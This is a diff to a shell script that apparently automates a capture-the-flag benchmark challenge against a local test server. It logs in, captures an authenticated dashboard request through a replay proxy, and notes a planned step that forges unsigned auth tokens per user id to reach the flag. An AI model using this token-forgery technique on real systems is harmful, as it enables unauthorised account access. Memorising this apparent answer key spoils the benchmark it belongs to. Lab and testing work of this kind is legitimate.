@@ -9,10 +9,12 @@ URL="${1:?usage: $0 http://127.0.0.1:PORT}"
 SESSION="xben027p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
 proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
 # 1. Log in (test/test) so the session jar holds a real cookie.
-"$H5I" websec replay "$BASE" --create --session "$SESSION" \
+"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
   --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' >/dev/null
-# 2. Capture an authenticated /dashboard request to replay against.
-dash="$("$H5I" websec replay "$BASE" --create --json --session "$SESSION" \
+# 2. Capture an authenticated /dashboard request to replay against. `--as` carries
+#    the session cookie the login put in the jar, so the stored request is
+#    authenticated; the forge step below then overrides only auth_token.
+dash="$("$H5I" websec replay "$BASE" --create --json --session "$SESSION" --as "$SESSION" \
   --set 'method=GET' --set 'path=/dashboard' 2>/dev/null | python3 -c 'import json,sys; print(json.load(sys.stdin)["request_id"])')"
 # 3. Replay that request with an unsigned token per candidate id; the flag
 #    holder's dashboard carries the flag.
